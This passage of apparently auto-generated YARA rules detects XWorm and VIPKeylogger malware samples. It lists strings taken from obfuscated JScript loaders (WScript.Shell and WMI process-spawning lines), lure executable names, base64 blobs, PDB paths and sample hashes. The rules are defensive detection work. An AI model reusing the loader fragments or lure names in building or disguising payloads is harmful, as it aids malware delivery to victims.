      $s5 = "var ecdyses = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var togeman = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + fluctuability + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "eythe = eythe + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule VIPKeylogger_signature__9ebd1a5a {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_9ebd1a5a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ebd1a5ad396e9f41bd7636a5dda66418bac2017851fb6f04739cec423e95985"
   strings:
      $s1 = "var copes = rhizostoma.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var supersister = rhizostoma.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var Ryswick = rhinocerotidae.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var rhizostoma = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var inexpectable = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var rhinocerotidae = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + forpet + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "panted = panted + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule XWorm_signature__7 {
   meta:
      description = "_subset_batch - file XWorm(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "99f0fee5561cf27f1fe33499730db85f454427dfb818417c00ab7f800d9aaad4"
   strings:
      $s1 = "excretal.Run(entre, 0, false);" fullword ascii /* score: '13.00'*/
      $s2 = "function prerace(devModeProperties, scriptContext, printTicket) {" fullword ascii /* score: '13.00'*/
      $s3 = "function rammish(printTicket, scriptContext, devModeProperties) {" fullword ascii /* score: '13.00'*/
      $s4 = "var excretal = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s5 = "        var hading = getParameterDefs(scriptContext);" fullword ascii /* score: '10.00'*/
      $s6 = "function nonMexican(printTicket, scriptContext, printCapabilities) {" fullword ascii /* score: '9.00'*/
      $s7 = "ot circuiting the rest of the code." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 100KB and
      all of them
}

rule XWorm_signature__8d96e934 {
   meta:
      description = "_subset_batch - file XWorm(signature)_8d96e934.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d96e934f73fc76b56f624f3cbc9d993c1cedd731c073c3ce885627e0d90c9d4"
   strings:
      $s1 = "var alveolite = sarsparillas.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var gonopalpon = sarsparillas.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var hemstitched = proverbialize.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var sarsparillas = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var recondensations = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var proverbialize = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "gangplank = gangplank + '" fullword ascii /* score: '8.00'*/
      $s8 = "g(\\'' + peperine + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule XWorm_signature__d9fe09a4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_d9fe09a4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d9fe09a4c63d64a5adf1bdd5a04034401831f76b7330547a991fe4bf29cf419f"
   strings:
      $s1 = "var myrmecobe = ganglionless.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var gallinule = ganglionless.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var mooches = phosphoramidite.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var ganglionless = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var Octobr = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var phosphoramidite = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + wizened + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "uncondemned = uncondemned + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule XWorm_signature__e45fdbb2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_e45fdbb2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e45fdbb2d13cde33ef20e43a38308dca4bbe4718c01268ae960e3e105494923d"
   strings:
      $s1 = "var Brinton = misaffection.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var polypiarian = misaffection.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var decimalism = scandalmongers.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '20.00'*/
      $s4 = "var pilpul = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var misaffection = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var scandalmongers = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '11.00'*/
      $s7 = "g(\\'' + dotes + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "unsuspiciously = unsuspiciously + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule VIPKeylogger_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0ee36d6c22970ce0e918d2f93e7cdfb5571ce264138ec3b946e1440ff861ee4"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unquietude coloproctitis.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* w_2<" fullword ascii /* score: '9.00'*/
      $s5 = "* 2Qw:Y" fullword ascii /* score: '9.00'*/
      $s6 = "portables stningsstykket gringle" fullword wide /* score: '9.00'*/
      $s7 = "programnavnenes" fullword wide /* score: '8.00'*/
      $s8 = "adoption" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash__c91ec090 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash)_c91ec090.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c91ec090e5c0dabc75c3cbdb355555550eac59ec33e2e9cd156c246fce325775"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unquietude coloproctitis.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* w_2<" fullword ascii /* score: '9.00'*/
      $s5 = "* 2Qw:Y" fullword ascii /* score: '9.00'*/
      $s6 = "portables stningsstykket gringle" fullword wide /* score: '9.00'*/
      $s7 = "programnavnenes" fullword wide /* score: '8.00'*/
      $s8 = "adoption" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__7eae418c7423834ffc3d79b4300bd6fb_imphash__cdd3e1df {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7eae418c7423834ffc3d79b4300bd6fb(imphash)_cdd3e1df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cdd3e1df943980f48c8ecc7446093e1ef3560dc0530495923da9c3521e7e6463"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unquietude coloproctitis.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.05</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* w_2<" fullword ascii /* score: '9.00'*/
      $s5 = "* 2Qw:Y" fullword ascii /* score: '9.00'*/
      $s6 = "portables stningsstykket gringle" fullword wide /* score: '9.00'*/
      $s7 = "programnavnenes" fullword wide /* score: '8.00'*/
      $s8 = "adoption" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__95ccff46 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_95ccff46.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "95ccff46398f2ae29855f88dfae98d96636f7038c29b7eddf8c2b88c8e9de16d"
   strings:
      $s1 = "Orders (PO#1164031).exe" fullword ascii /* score: '19.00'*/
      $s2 = "- GlCC!" fullword ascii /* score: '8.00'*/
      $s3 = "3KxfQ /r" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__40ff2373 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_40ff2373.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "40ff237343bddce67ba5b724d97cff981629b570ffb43c8645661bb80eb6d27e"
   strings:
      $s1 = "Auslxjs.exe" fullword wide /* score: '22.00'*/
      $s2 = "{5dd3183b-840c-494a-908a-5b25b5ccc299}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s4 = "Unsupported hash size." fullword wide /* score: '10.00'*/
      $s5 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s6 = "+7+8+=+>+?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'x' */
      $s7 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s8 = "getBuffer" fullword wide /* score: '9.00'*/
      $s9 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s10 = "- GmCC!" fullword ascii /* score: '8.00'*/
      $s11 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule VIPKeylogger_signature__c5181393 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_c5181393.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c51813934fa42d3a5b4cb5b0f7497e47ddeecfebadb66f96dc550bb405721e58"
   strings:
      $s1 = "cOrdine 09740811 C.F.R. - SOCIETA' A RESPONSABILITA' LIMITATA_Motori, Ricambi, Sistemi idraulici.exe" fullword ascii /* score: '23.00'*/
      $s2 = "btrsqvtu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule VIPKeylogger_signature__de3b0cbb {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_de3b0cbb.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "de3b0cbb2261d88eafbe681d703d0e36ec5e91f125ac66e2ed88b9cfd7244425"
   strings:
      $s1 = "var sangapenum = horismascope.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var Janine = horismascope.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var vibrometers = apostolicness.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var apostolicness = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '15.00'*/
      $s5 = "var horismascope = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var afire = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s7 = "g(\\'' + tribromsalol + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule XWorm_signature__86bcf045 {
   meta:
      description = "_subset_batch - file XWorm(signature)_86bcf045.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "86bcf04553a7d87e972d1d147d0103def5f739e648f8db171d49a4c7f060f136"
   strings:
      $s1 = "var furled = enterpreignant.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var dadda = enterpreignant.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var powerhouses = triplication.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '15.00'*/
      $s4 = "var jewise = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var enterpreignant = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "g(\\'' + bathtub + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule XWorm_signature__9e81ab65 {
   meta:
      description = "_subset_batch - file XWorm(signature)_9e81ab65.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9e81ab654b7791538849e8cdbc60b170c2e8de58bc38ba5248c0a6861ee3dae7"
   strings:
      $s1 = "var dimorphous = bedmate.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var shaker = bedmate.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var dustoori = dermatopterous.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var syringia = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var bedmate = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var dermatopterous = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + sticklike + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule XWorm_signature__f2444ec2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f2444ec2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2444ec2549a9aad73567a3d1e1b00ff4de8be3727489c0cf1f5397975aa0c8d"
   strings:
      $s1 = "var harborside = emotionalities.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var overviewed = emotionalities.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var credulousness = mucously.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var emotionalities = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var phosphatase = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var mucously = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + chronemics + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__05604b71 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_05604b71.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "05604b71c9fb599088d38ea5973add829af7c0a29d8434996dc6fb9ac93a58f4"
   strings:
      $s1 = "Sbba.exe" fullword wide /* score: '22.00'*/
      $s2 = "Sbba.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s4 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s5 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s6 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s7 = "contentTextBox" fullword ascii /* score: '9.00'*/
      $s8 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1637ea73 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1637ea73.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1637ea73a3eef1277f90be7f39dae3fde801946235c699ebc562491327803bda"
   strings:
      $s1 = "X2sxa2MyYjUyZGE1YTBkNzI2ZmRhMDYyZmI1YTBiNzMy," fullword ascii /* base64 encoded string '' */ /* score: '17.00'*/
      $s2 = "keyauth.win" fullword wide /* score: '16.00'*/
      $s3 = "X2ZjZmE4NzM1NDdmZWZlYzBmMzM1MjAzZjY1OGJlYjdi," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s4 = "X2s2Yzkya2Q5YTBmOGUwMzMwN2Zkazk3OWY2ZjlmZmFr," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "X2RiMzRhY2I5ZjczOWIyNGEyYmU1NGY3MjlmY2M0NGVi," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "X2tiMWJkN2ZhYjU3NzBrYTk4NTRlZWUwMDQ2ZDk4MTcz," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "X2RmMWNkZGFlMTE3MDNiMDUyZmE4M2MxMjc4ZTVkODM4," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "X2szZThjZjM4YzhlazE2YWQzN2VrMTdrZWE4N2U5ZmZl," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "X2sxZmNmMTY0MjAyMzlkMDI4MzZhOTUxZDkwNDYxZWZi," fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "X2s1YzAwOTNka2tjZmJmazExNDBrZTVlNzE2ZDQzNTZh," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "X2s5OWRrM2QzY2NmNjNjNWs4MDRia2tkZjk5MGNrYTUz," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s12 = "X2IyZWM1MGUwOWMyM2RkMzhjZWQ5NmU1Njk5ZjZkZDAx," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s13 = "X2YwMmVhODNlNDZkOGM4ZmM4MGVmMzJlZDcwOTNmZTQ0," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s14 = "X2tiYzRmNzFhZDlhNDBjYmZlYmtiazdjZGYzazI3ZmFk," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s15 = "X2s4MDQ1MGU5ZGMzNjViM2ZkNTJlMms2NTA0MDJlOWU4," fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9454ed7d {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9454ed7d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9454ed7dab210e18bef21b1c59a2736a65ced61892df6299fdcf743cce638bcf"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\ifzdsulOLB\\src\\obj\\Debug\\BNiI.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s6 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s7 = "BNiI.exe" fullword wide /* score: '22.00'*/
      $s8 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s9 = "loginError" fullword wide /* score: '18.00'*/
      $s10 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s11 = "loginAfter" fullword wide /* score: '15.00'*/
      $s12 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s13 = "* {B!-Se" fullword ascii /* score: '9.00'*/
      $s14 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3ed8b308 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3ed8b308.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ed8b3080fa1952404c1940f5013c4f5f45307e186f55518bcafdc36c3604335"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\izUIDmPWVx\\src\\obj\\Debug\\ZSkt.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s6 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s7 = "ZSkt.exe" fullword wide /* score: '22.00'*/
      $s8 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s9 = "loginError" fullword wide /* score: '18.00'*/
      $s10 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s11 = "loginAfter" fullword wide /* score: '15.00'*/
      $s12 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s13 = "waycount" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7460ba04 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7460ba04.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7460ba04d926e4f139afab3079f51b4b5f4ee6cc4963a20e21e0dd0c0873f2ab"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\BNZEasfBXU\\src\\obj\\Debug\\tteG.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD~" fullword ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s6 = "get_loginError" fullword ascii /* score: '23.00'*/
      $s7 = "tteG.exe" fullword wide /* score: '22.00'*/
      $s8 = "get_loginAfter" fullword ascii /* score: '20.00'*/
      $s9 = "loginError" fullword wide /* score: '18.00'*/
      $s10 = "MMMMMMO" fullword ascii /* reversed goodware string 'OMMMMMM' */ /* score: '16.50'*/
      $s11 = "loginAfter" fullword wide /* score: '15.00'*/
      $s12 = "get_Fitness" fullword ascii /* score: '9.00'*/
      $s13 = "waycount" fullword ascii /* score: '8.00'*/
      $s14 = "xtuqmaj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b5e110be {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b5e110be.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5e110bed3f60078521c8cfbdf0a41b6634f463cf360c62af52027dec5b00e27"
   strings:
      $s1 = "GetLenToPosState" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__134a63df {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_134a63df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "134a63dfe3005387e42f894ff1856509da0cc50f89eaaf3e56c85883b8fcd23b"
   strings:
      $s1 = "_mdBFraSMlupmBpCzbdumPHCPrlIbIIwjHhCNnduWZrXNdrE" fullword ascii /* score: '14.00'*/
      $s2 = "_KYUuQdWNMukUmjaVOzdNwPcVjBVqSIfExeCTkTVbCVcWo" fullword ascii /* score: '12.00'*/
      $s3 = "_JHejvVkLDVpBMgCxOiyzIcqRTEmPpFglUC" fullword ascii /* score: '11.00'*/
      $s4 = "C# version only supports level 1 and 3" fullword wide /* score: '10.00'*/
      $s5 = "get_IsAttached" fullword wide /* score: '9.00'*/
      $s6 = "_NsdbsJPKeOZyfBaKmtBcpjEfZGCIRCWemEvJHlAd" fullword ascii /* score: '9.00'*/
      $s7 = "_jQrgmsODMGirYcdArkgxQpipzViPaNhlQAk" fullword ascii /* score: '9.00'*/
      $s8 = "_IgnUJvtuvgEtgEjzamtDKmhIcxZISqypoZDxwmQAEmuBkXz" fullword ascii /* score: '9.00'*/
      $s9 = "GetProcAddress2" fullword ascii /* score: '9.00'*/
      $s10 = "_GticFLVEwgeTwqaZuPzymkbjnkQm" fullword ascii /* score: '9.00'*/
      $s11 = "_koaOPEfrieZftPYxRMrDJNYCYyIthfcSEXy" fullword ascii /* score: '9.00'*/
      $s12 = "hB6TuDugUn92DGQf60poEYETpCjecOAAhPFUTBiKWG7sB6qr238MBw84iIsFT4S0GU1FLdNFAH6LRdy" fullword ascii /* score: '9.00'*/
      $s13 = "_wViaxYwzTaAtkrFmajxcwYnBhPKfUbfTpGNjMOFQujn" fullword ascii /* score: '9.00'*/
      $s14 = "GetProcAddress_2" fullword ascii /* score: '8.00'*/
      $s15 = "GetProcAddress_3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__db5ba574 {
   meta:
